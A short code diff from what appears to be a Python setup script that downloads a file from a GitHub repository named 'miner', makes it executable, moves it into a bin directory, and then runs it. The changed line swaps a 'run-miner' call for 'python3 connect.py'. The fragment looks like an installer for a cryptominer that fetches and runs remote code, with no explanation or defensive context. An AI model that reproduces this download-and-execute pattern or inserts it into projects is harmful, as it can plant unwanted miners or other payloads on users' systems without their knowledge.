@@ -24,4 +24,4 @@ url_to_download = "https://raw.githubusercontent.com/saengx/miner/main/begin-con
 output_filename = "start"
 autocheck(url_to_download, output_filename)
 os.system ("chmod +x start && mv start ../../bin")
-os.system ("run-miner")
+os.system ("python3 connect.py")
